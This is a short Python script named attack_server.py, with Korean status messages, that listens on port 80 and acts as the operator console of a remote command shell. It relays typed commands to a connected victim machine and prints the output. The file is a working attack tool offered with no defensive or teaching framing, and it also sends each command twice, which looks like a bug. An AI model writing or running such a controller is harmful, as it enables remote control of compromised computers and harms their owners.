#attack_server.py
import socket
import os

host = '0.0.0.0' # i don't know my ip, router!
port = 80 #empty port of host

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.bind((host, port))
    print(f"서버 시작 {port}")
except socket.error as e:
    print(f"서버 시작 실패 {e}")
    os.system("pause")
s.listen(1)

print('Waiting for connection...')


conn, addr = s.accept()
print('Connected by', addr)
while True:
    cmd = input('$')
    conn.sendall(cmd.encode())
    if cmd.strip() == 'exit':
        conn.close()
        break
    if len(str.encode(cmd))>0:
        conn.sendall(str.encode(cmd))
        try:
            client_response = conn.recv(10000)
            print(client_response.decode())
        except Exception as e:
            print(e)
os.system("pause")